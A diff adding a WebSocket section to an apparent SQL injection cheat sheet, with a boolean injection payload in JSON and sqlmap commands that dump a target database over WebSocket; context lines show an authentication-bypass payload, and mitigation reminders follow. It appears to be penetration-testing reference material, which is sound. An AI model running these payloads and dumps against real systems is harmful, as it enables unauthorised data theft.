@@ -84,6 +84,18 @@ admin' #
 | `DUAL`, `FROM dual` | Oracle |
 | `sqlite_master` | SQLite |
 
+## WebSocket Automation
+
+- Switch to a WebSocket-aware client when the application upgrades connections (e.g. `wscat -c ws://host:port/ws`).
+- Boolean probes still work; wrap the JSON payload with logical operators such as `{"id":"92130 OR 5=1-- -"}`.
+- sqlmap can drive WebSockets directly:
+
+```bash
+sqlmap -u 'ws://target/ws' --data '{"id":"*"}' --batch
+sqlmap -u 'ws://target/ws' --data '{"id":"*"}' --level 5 --risk 3 --dump
+```
+
+
 ## Mitigation Reminders
 
 - Parameterized queries or stored procedures only.
